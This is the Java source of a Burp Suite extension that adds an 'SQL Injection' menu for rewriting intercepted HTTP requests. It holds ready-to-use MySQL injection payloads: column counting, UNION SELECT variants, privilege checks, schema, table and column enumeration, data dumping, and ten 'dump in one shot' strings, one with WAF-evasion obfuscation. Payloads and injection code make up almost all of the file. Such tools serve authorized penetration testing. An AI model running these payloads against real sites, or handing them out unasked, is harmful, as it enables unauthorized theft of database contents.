/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package burp;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.math.BigInteger;
import javax.swing.JMenu;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JSeparator;

/**
 *
 * @author abdul.wahab
 */
public class SQL_Menu extends JMenu{
    public BurpExtender myburp;
    
    SQL_Menu(BurpExtender burp){
        this.setText("SQL Injection");
        this.myburp = burp;
        this.Create_SQL_Menu();
    }
    
    public void Create_SQL_Menu(){
        JMenu SQL_Column_Menu = new JMenu("Column Count");
        JMenu SQL_Union_Menu = new JMenu("Union Statements");
        JMenu SQL_Basics_Menu = new JMenu("Basic Statements");
        JMenu SQL_Databses_Menu = new JMenu("Databses");
        JMenu SQL_Tables_Menu = new JMenu("Tables");
        JMenu SQL_Columns_Menu = new JMenu("Columns");
        JMenu SQL_Data_Menu = new JMenu("Data");
        JMenu SQL_DIOS_Menu = new JMenu("DIOS MySQL");
        
        JMenuItem col_order_by = new JMenuItem("Order By");
        JMenuItem col_group_by = new JMenuItem("Group By");
        JMenuItem col_procedure_analyse = new JMenuItem("Procedure Analyse");
        col_order_by.addActionListener(new MenuItemListener(myburp));
        col_group_by.addActionListener(new MenuItemListener(myburp));
        col_procedure_analyse.addActionListener(new MenuItemListener(myburp));
        SQL_Column_Menu.add(col_order_by);
        SQL_Column_Menu.add(col_group_by);
        SQL_Column_Menu.add(col_procedure_analyse);
        
        JMenuItem uni_int_int = new JMenuItem("Union Select");
        JMenuItem uni_all_int = new JMenuItem("Union All Select (int)");
        JMenuItem uni_all_null = new JMenuItem("Union All Select(null)");
        JMenuItem uni_not_space = new JMenuItem("(INT),(INT)");
        JMenuItem uni_null_space = new JMenuItem("(NULL),(NULL)");
        uni_int_int.addActionListener(new MenuItemListener(myburp));
        uni_all_int.addActionListener(new MenuItemListener(myburp));
        uni_all_null.addActionListener(new MenuItemListener(myburp));
        uni_not_space.addActionListener(new MenuItemListener(myburp));
        uni_null_space.addActionListener(new MenuItemListener(myburp));
        SQL_Union_Menu.add(uni_int_int);
        SQL_Union_Menu.add(uni_all_int);
        SQL_Union_Menu.add(uni_all_null);
        SQL_Union_Menu.add(uni_not_space);
        SQL_Union_Menu.add(uni_null_space);

        JMenuItem basics_1 = new JMenuItem("User,DB,Version");
        JMenuItem basics_dbcount = new JMenuItem("Count Databases");
        JMenuItem basics_file_priv = new JMenuItem("File Priv (USER_PRIVILEGES)");
        JMenuItem basics_file_priv2 = new JMenuItem("File Priv (MySQL System Table)");
        basics_1.addActionListener(new MenuItemListener(myburp));
        basics_dbcount.addActionListener(new MenuItemListener(myburp));
        basics_file_priv.addActionListener(new MenuItemListener(myburp));
        basics_file_priv2.addActionListener(new MenuItemListener(myburp));
        SQL_Basics_Menu.add(basics_1);
        SQL_Basics_Menu.add(basics_dbcount);
        SQL_Basics_Menu.add(basics_file_priv);
        SQL_Basics_Menu.add(basics_file_priv2);
        
        JMenuItem db_group_concat = new JMenuItem("DB Group Concat");
        JMenuItem db_one_shot = new JMenuItem("DB One Shot");
        db_group_concat.addActionListener(new MenuItemListener(myburp));
        db_one_shot.addActionListener(new MenuItemListener(myburp));
        SQL_Databses_Menu.add(db_group_concat);
        SQL_Databses_Menu.add(db_one_shot);
        
        JMenuItem tb_group_concat = new JMenuItem("Table Group Concat");
        JMenuItem tb_one_shot = new JMenuItem("Table One Shot");
        tb_group_concat.addActionListener(new MenuItemListener(myburp));
        tb_one_shot.addActionListener(new MenuItemListener(myburp));
        SQL_Tables_Menu.add(tb_group_concat);
        SQL_Tables_Menu.add(tb_one_shot);
        
        JMenuItem col_group_concat = new JMenuItem("Column Group Concat");
        JMenuItem col_one_shot = new JMenuItem("Column One Shot");
        col_group_concat.addActionListener(new MenuItemListener(myburp));
        col_one_shot.addActionListener(new MenuItemListener(myburp));
        SQL_Columns_Menu.add(col_group_concat);
        SQL_Columns_Menu.add(col_one_shot);
        
        JMenuItem data_group_concat = new JMenuItem("Data Group Concat");
        JMenuItem data_one_shot = new JMenuItem("Data One Shot");
        data_group_concat.addActionListener(new MenuItemListener(myburp));
        data_one_shot.addActionListener(new MenuItemListener(myburp));
        SQL_Data_Menu.add(data_group_concat);
        SQL_Data_Menu.add(data_one_shot);
        
        
        JMenuItem dios_makman = new JMenuItem("DIOS by makman");
        JMenuItem dios_makman2 = new JMenuItem("DIOS by makman v2");
        JMenuItem dios_an0nEx = new JMenuItem("DIOS by An0n 3xPloiTeR");
        JMenuItem dios_d3vilbug = new JMenuItem("DIOS by d3vilbug");
        JMenuItem dios_madblood = new JMenuItem("DIOS by Madblood");
        JMenuItem dios_drzero = new JMenuItem("DIOS by Dr.Z3r0");
        JMenuItem dios_zen = new JMenuItem("DIOS by Zen");
        JMenuItem dios_shariq = new JMenuItem("DIOS by Shariq");
        JMenuItem dios_replace = new JMenuItem("DIOS using replace");
        JMenuItem dios_zen_waf = new JMenuItem("DIOS by Zen WAF");
        dios_makman.addActionListener(new MenuItemListener(myburp));
        dios_makman2.addActionListener(new MenuItemListener(myburp));
        dios_an0nEx.addActionListener(new MenuItemListener(myburp));
        dios_d3vilbug.addActionListener(new MenuItemListener(myburp));
        dios_madblood.addActionListener(new MenuItemListener(myburp));
        dios_drzero.addActionListener(new MenuItemListener(myburp));
        dios_zen.addActionListener(new MenuItemListener(myburp));
        dios_shariq.addActionListener(new MenuItemListener(myburp));
        dios_replace.addActionListener(new MenuItemListener(myburp));
        dios_zen_waf.addActionListener(new MenuItemListener(myburp));
        SQL_DIOS_Menu.add(dios_makman);
        SQL_DIOS_Menu.add(dios_makman2);
        SQL_DIOS_Menu.add(dios_an0nEx);
        SQL_DIOS_Menu.add(dios_d3vilbug);
        SQL_DIOS_Menu.add(dios_madblood);
        SQL_DIOS_Menu.add(dios_drzero);
        SQL_DIOS_Menu.add(dios_zen);
        SQL_DIOS_Menu.add(dios_shariq);
        SQL_DIOS_Menu.add(dios_replace);
        SQL_DIOS_Menu.add(dios_zen_waf);
        
        this.add(SQL_Column_Menu);
        this.add(SQL_Union_Menu);
        this.add(new JSeparator());
        this.add(SQL_Basics_Menu);
        this.add(new JSeparator());
        this.add(SQL_Databses_Menu);
        this.add(SQL_Tables_Menu);
        this.add(SQL_Columns_Menu);
        this.add(SQL_Data_Menu);
        this.add(SQL_DIOS_Menu);
    }
}

class MenuItemListener implements ActionListener {

    BurpExtender myburp;
    MenuItemListener(BurpExtender burp) {
        myburp = burp;
    }
    
    @Override
    public void actionPerformed(ActionEvent e) {
        int[] selectedIndex = myburp.context.getSelectionBounds();
        IHttpRequestResponse req = myburp.context.getSelectedMessages()[0];
        byte[] request = req.getRequest();
        byte[] param = new byte[selectedIndex[1]-selectedIndex[0]];
        System.arraycopy(request, selectedIndex[0], param, 0, selectedIndex[1]-selectedIndex[0]);
        String selectString = new String(param);
        String action = e.getActionCommand();
        byte[] newRequest = do_sql_op(request, selectString, action, selectedIndex);
        req.setRequest(newRequest);
//        JOptionPane.showMessageDialog(null, action + " --> " + selectedIndex[0] + " - " + selectedIndex[1] + " -- " + selectString);
        
    }
    
    public byte[] do_modify_request(byte[] request, int[] selectedIndex, String modifiedString){
        byte[] modString = modifiedString.getBytes();
        byte[] newRequest = new byte[request.length + modifiedString.length() - (selectedIndex[1]-selectedIndex[0])];
        System.arraycopy(request, 0, newRequest, 0, selectedIndex[0]);
        System.arraycopy(modString, 0, newRequest, selectedIndex[0], modString.length);
        System.arraycopy(request, selectedIndex[1], newRequest, selectedIndex[0]+modString.length, request.length-selectedIndex[1]);
        return newRequest;
    }
    
    public String prompt_and_validate_input(String prompt, String str){
        String user_input = JOptionPane.showInputDialog(prompt, str);
        while(user_input.trim().equals("")){
            user_input = JOptionPane.showInputDialog(prompt, str);
        }
        return user_input.trim();
    }
    
    public String creat_number_list(int count, String str, String str2){
        String col = "+";
        String tmp = ",";
        if(str2 != null ){ tmp = "),("; col = "(";}
        for(int i = 1; i<= count; i++){    
            if(str != null){
                col = col + str + tmp;
            }else{
                col = col + i + tmp;
            }
        }
        col = col.substring(0, col.length()-1);
        if(str2 != null){ col = col.substring(0, col.length()-1);}
        return col;
    }
    

    public byte[] do_sql_op(byte[] request, String selectedString, String action, int[] selectedIndex){
        String database = null, table = null, columns = null;
        String tmp = null;
        switch(action){
            case "Order By":
                columns = prompt_and_validate_input("Enter No. of Columns", null);
                selectedString = selectedString +"+Order+By+" + columns + "+";
                break;
            case "Group By":
                columns = prompt_and_validate_input("Enter No of Columns", null);
                tmp = creat_number_list(Integer.valueOf(columns), null, null);
                selectedString = selectedString + "+GROUP+BY" +  tmp + "+";
                break;
            case "Procedure Analyse":
                selectedString = selectedString + "+PROCEDURE+ANALYSE()+";
                break;
            case "Union Select":
                columns = prompt_and_validate_input("Enter No. of Columns", null);
                tmp = creat_number_list(Integer.valueOf(columns), null, null);
                selectedString = selectedString + "+Union+Select" + tmp + "+";
                break;
            case "Union All Select (int)":
                columns = prompt_and_validate_input("Enter No. of Columns", null);
                tmp = creat_number_list(Integer.valueOf(columns), null, null);
                selectedString = selectedString + "+Union+ALL+Select" + tmp + "+";
                break;
            case "Union All Select(null)":
                columns = prompt_and_validate_input("Enter No. of Columns", null);
                tmp = creat_number_list(Integer.valueOf(columns), "NULL", null);
                selectedString = selectedString + "+Union+ALL+Select" + tmp + "+";
                break;
            case "(INT),(INT)":
                columns = prompt_and_validate_input("Enter No. of Columns", null);
                tmp = creat_number_list(Integer.valueOf(columns), null, "()");
                selectedString = selectedString + "+Union(Select" + tmp + ")+";
                break;
            case "(NULL),(NULL)":
                columns = prompt_and_validate_input("Enter No. of Columns", null);
                tmp = creat_number_list(Integer.valueOf(columns), "NULL", "()");
                selectedString = selectedString + "+Union(Select" + tmp + ")+";
                break;
            case "User,DB,Version":
                selectedString = selectedString + "CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION())";
                break;
            case "Count Databases":
                selectedString = selectedString + "(SELECT+COUNT(schema_name)+FROM+INFORMATION_SCHEMA.SCHEMATA)";
                break;
            case "File Priv (USER_PRIVILEGES)":
                selectedString = selectedString + "(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES)";
                break;
            case "File Priv (MySQL System Table)":
                selectedString = selectedString + "(SELECT+GROUP_CONCAT(user,0x202d3e20,file_priv,0x3c62723e)+FROM+mysql.user)";
                break;
            case "DB Group Concat":
                selectedString = selectedString + "(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)";
                break;
            case "DB One Shot":
                selectedString = selectedString + "(SELECT+(@x)+FROM+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+FROM+(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name,0x3c62723e))))x)";
                break;
            case "Table Group Concat":
                database = prompt_and_validate_input("Enter Database Name", "DATABASE()");
                database = "0x" + String.format("%x", new BigInteger(1, database.getBytes()));
                selectedString = selectedString + "(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=" + database + ")";
                break;
            case "Table One Shot":
                selectedString = selectedString + "(SELECT+(@x)+FROM+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+FROM+(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name,0x3c62723e))))x)";
                break;
            case "Column Group Concat":
                table = prompt_and_validate_input("Enter Table Name", null);
                table = "0x" + String.format("%x", new BigInteger(1, table.getBytes()));
                selectedString = selectedString + "(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=" + table + ")";
                break;
            case "Column One Shot":
                table = prompt_and_validate_input("Enter Table Name", null);
                table = "0x" + String.format("%x", new BigInteger(1, table.getBytes()));
                selectedString = selectedString + "(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.COLUMNS)WHERE(TABLE_NAME=" + table + ")AND(0x00)IN(@x:=concat(@x,CONCAT(LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,column_name,0x3c62723e)))))x)";
                break;
            case "Data Group Concat":
                database = prompt_and_validate_input("Enter Database Name", "DATABASE()");
                table = prompt_and_validate_input("Enter Table Name", null);
                columns = prompt_and_validate_input("Enter Column to dump", null).replace(' ', '+');
                if (!database.toLowerCase().equals("database()")){ table = database+"."+table;}
                selectedString = selectedString + "(SELECT+GROUP_CONCAT(" + columns + "+SEPARATOR+0x3c62723e)+FROM+" + table + ")";
                break;
            case "Data One Shot":
                database = prompt_and_validate_input("Enter Database Name", "DATABASE()");
                table = prompt_and_validate_input("Enter Table Name", null);
                columns = prompt_and_validate_input("Enter Column to dump", null).replace(' ', '+');
                if (!database.toLowerCase().equals("database()")){ table = database+"."+table;}
                selectedString = selectedString + "(SELECT(@x)FROM(SELECT(@x:=0x00),(SELECT(@x)FROM(" + table + ")WHERE(@x)IN(@x:=CONCAT(0x20,@x," + columns + ",0x3c62723e))))x)";
                break;
            case "DIOS by makman":
                selectedString = selectedString + "concat(0x3c64697620616c69676e3d226c65667422207374796c653d22666f6e742d66616d696c793a20436f6d69632053616e73204d53223e3c68313e44494f53204279206d616b6d616e3c2f68313e,user(),0x3c62723e,version(),@x:='',@y:='',@schname:='',@tbl:='',0x0a,if(benchmark((select+count(*)from+information_schema.schemata+where+schema_name!='information_schema'),@x:=concat(@x,0x0a0a,@y:='',(select+concat(0x3c68723e,repeat(0x2d,length(schema_name)),0x3c62723e,@schname:=schema_name,0x3c62723e,repeat(0x2d,length(schema_name)),if((select+count(*)from+information_schema.columns+where+table_schema=schema_name+and+@y:=concat(@y,0x0a,if(@tbl!=table_name,concat(0x3c62723e2d2d3e20,@tbl:=table_name,0x3a3a,(select+table_rows+from+information_schema.tables+where+table_schema=schema_name+and+table_name=@tbl+limit+1)),concat(0x2a,column_name)))),'',''),@y)from+information_schema.schemata+where+schema_name!='information_schema'+and+schema_name+>+@schname+order+by+schema_name+ASC+limit+1))),'',''),0x0a,@x)+as+makman";
                break;
            case "DIOS by makman v2":
                database = prompt_and_validate_input("Enter Database Name", "DATABASE()");
                if (!database.toLowerCase().equals("database()")){ database = "0x" + String.format("%x", new BigInteger(1, database.getBytes()));}
                selectedString = selectedString + "(select(@x)from(select(@x:=0x00),(@nr:=0),(@tbl:=0x0),(select(0)from(information_schema.tables)where(table_schema=" + database + ")and(0x00)in(@x:=concat_ws(0x20,@x,lpad(@nr:=@nr%2b1,3,0x0b),0x2e20,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d677265656e3e203a3a3a3a3c2f666f6e743e3c666f6e7420636f6c6f723d626c75653e20207b2020436f6c756d6e73203a3a205b3c666f6e7420636f6c6f723d7265643e,(select+count(*)+from+information_schema.columns+where+table_name=@tbl),0x3c2f666f6e743e5d20207d3c2f666f6e743e,0x3c62723e))))x)";
                break;
            case "DIOS by An0n 3xPloiTeR":
                selectedString = selectedString + "concat(0x3c616464726573733e3c63656e7465723e3c62723e3c68313e3c666f6e7420636f6c6f723d22526564223e496e6a65637465642062792022416e306e203378506c6f69546552223c2f666f6e743e3c68313e3c2f63656e7465723e3c62723e3c666f6e7420636f6c6f723d2223663364393361223e4461746162617365207e3e3e203c2f666f6e743e,database(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643936223e56657273696f6e207e3e3e203c2f666f6e743e,@@version,0x3c62723e3c666f6e7420636f6c6f723d2223306637363964223e55736572207e3e3e203c2f666f6e743e,user(),0x3c62723e3c666f6e7420636f6c6f723d2223306639643365223e506f7274207e3e3e203c2f666f6e743e,@@port,0x3c62723e3c666f6e7420636f6c6f723d2223346435613733223e4f53207e3e3e203c2f666f6e743e,@@version_compile_os,0x2c3c62723e3c666f6e7420636f6c6f723d2223366134343732223e44617461204469726563746f7279204c6f636174696f6e207e3e3e203c2f666f6e743e,@@datadir,0x3c62723e3c666f6e7420636f6c6f723d2223333130343362223e55554944207e3e3e203c2f666f6e743e,UUID(),0x3c62723e3c666f6e7420636f6c6f723d2223363930343637223e43757272656e742055736572207e3e3e203c2f666f6e743e,current_user(),0x3c62723e3c666f6e7420636f6c6f723d2223383432303831223e54656d70204469726563746f7279207e3e3e203c2f666f6e743e,@@tmpdir,0x3c62723e3c666f6e7420636f6c6f723d2223396336623934223e424954532044455441494c53207e3e3e203c2f666f6e743e,@@version_compile_machine,0x3c62723e3c666f6e7420636f6c6f723d2223396630613838223e46494c452053595354454d207e3e3e203c2f666f6e743e,@@CHARACTER_SET_FILESYSTEM,0x3c62723e3c666f6e7420636f6c6f723d2223393234323564223e486f7374204e616d65207e3e3e203c2f666f6e743e,@@hostname,0x3c62723e3c666f6e7420636f6c6f723d2223393430313333223e53797374656d2055554944204b6579207e3e3e203c2f666f6e743e,UUID(),0x3c62723e3c666f6e7420636f6c6f723d2223613332363531223e53796d4c696e6b20207e3e3e203c2f666f6e743e,@@GLOBAL.have_symlink,0x3c62723e3c666f6e7420636f6c6f723d2223353830633139223e53534c207e3e3e203c2f666f6e743e,@@GLOBAL.have_ssl,0x3c62723e3c666f6e7420636f6c6f723d2223393931663333223e42617365204469726563746f7279207e3e3e203c2f666f6e743e,@@basedir,0x3c62723e3c2f616464726573733e3c62723e3c666f6e7420636f6c6f723d22626c7565223e,(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x3c666f6e7420636f6c6f723d22726564223e20202d2d2d3e203c2f666f6e743e,column_name,0x3c62723e))))a))";
                break;
            case "DIOS by d3vilbug":
                selectedString = selectedString + "concat_ws(0x3c62723e2028405f402920,(select+0xaa3c64697620616c69676e3d226c65667422207374796c653d22666f6e742d66616d696c793a20436f6d69632053616e73204d533b223e3c68313e496e6a656374656420627920643376696c5f6275673c2f68313e),(select+concat(0x55736572,0x203c3c3c3d3d3d3d3e3e3e20,USER())),(select+concat(0x4461746162617365,0x203c3c3c3d3d3d3d3e3e3e20,DATABASE())),(select+concat(0x56657273696f6e,0x203c3c3c3d3d3d3d3e3e3e20,VERSION())),(select+concat(0x4f53,0x203c3c3c3d3d3d3d3e3e3e20,@@version_compile_os)),(select+concat(0x486f73746e616d65,0x203c3c3c3d3d3d3d3e3e3e20,@@hostname)),(select+0x3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a),(select concat((select+concat(0x3c62207374796c653d27666f6e742d73697a653a33327078273e4461746162617365733c2f623e3c62723e28405f402920,(SELECT+(@x)+FROM+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+FROM+(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name,0x3c62723e28405f402920))))x))),0x3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a3a)),(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where+table_schema!=0x696e666f726d6174696f6e5f736368656d61+and(@a)in (@a:=concat(@a,table_schema,0x20203e20,table_name,0x203e20,column_name,0x3c62723e28405f402920))))a))";
                break;
            case "DIOS by Madblood":
                selectedString = selectedString + "(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))";
                break;
            case "DIOS by Dr.Z3r0":
                selectedString = selectedString + "(select(select+concat(@:=0xa7,(select+count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@)))";
                break;
            case "DIOS by Zen":
                selectedString = selectedString + "make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)";
                break;
            case "DIOS by Shariq":
                selectedString = selectedString + "(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)";
                break;
            case "DIOS using replace":
                selectedString = selectedString + "replace(replace(replace(0x232425,0x23,@:=replace(replace(replace(replace(0x243c62723e253c62723e3c666f6e7420636f6c6f723d7265643e263c2f666f6e743e3c62723e3c666f6e7420636f6c6f723d707572706c653e273c2f666f6e743e3c666f6e7420636f6c6f723d7265643e,0x24,0x3c62723e3c62723e3c666f6e7420636f6c6f723d626c61636b3e72306f744048335834393c2f666f6e743e3c666f6e7420636f6c6f723d626c75653e),0x25,version()),0x26,database()),0x27,user())),0x24,(select+count(*)+from+%0Ainformation_schema.columns+where+table_schema=database()+and@:=replace(replace(0x003c62723e2a,0x00,@),0x2a,table_name))),0x25,@)";
                break;
            case "DIOS by Zen WAF":
                selectedString = selectedString + "(/*!12345sELecT*/(@)from(/*!12345sELecT*/(@:=0x00),(/*!12345sELecT*/(@)from(`InFoRMAtiON_sCHeMa`.`ColUMNs`)where(`TAblE_sCHemA`=DatAbAsE/*data*/())and(@)in(@:=CoNCat%0a(@,0x3c62723e5461626c6520466f756e64203a20,TaBLe_nAMe,0x3a3a,column_name))))a)";
                break;
            default:
                selectedString = selectedString;
                
        }
        return do_modify_request(request, selectedIndex, selectedString);
    }
}
